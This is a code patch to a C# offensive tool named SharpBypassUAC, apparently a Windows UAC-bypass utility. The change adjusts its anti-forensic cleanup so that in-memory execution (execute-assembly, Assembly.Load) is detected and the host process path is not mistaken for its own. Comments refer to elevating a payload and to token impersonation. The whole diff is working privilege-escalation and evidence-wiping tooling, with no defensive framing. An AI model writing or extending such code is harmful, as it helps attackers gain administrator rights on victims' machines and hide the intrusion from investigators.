@@ -104,9 +104,13 @@ namespace SharpBypassUAC
             string selfPath = null;
             if (cleanup)
             {
+                // Resolve selfPath — may be null/empty for in-memory execution
+                // (execute-assembly, Assembly.Load): MainModule.FileName returns
+                // the HOST process path, not our assembly. IsInMemory() handles this.
                 try
                 {
-                    selfPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                    if (!AntiForensic.IsInMemory())
+                        selfPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                 }
                 catch { }
                 AntiForensic.RunLight(selfPath);
@@ -158,7 +162,9 @@ namespace SharpBypassUAC
                 // The bypass elevated our payload, but this process may still
                 // be medium integrity. The elevated child should run its own
                 // full cleanup. Here we do what we can at current integrity.
-                if (cleanup && selfPath != null)
+                // Note: selfPath may be null for in-memory execution — Run()
+                // handles this internally via IsInMemory() detection.
+                if (cleanup)
                 {
                     // Check if we have high integrity (token impersonation gives it)
                     bool isElevated = false;
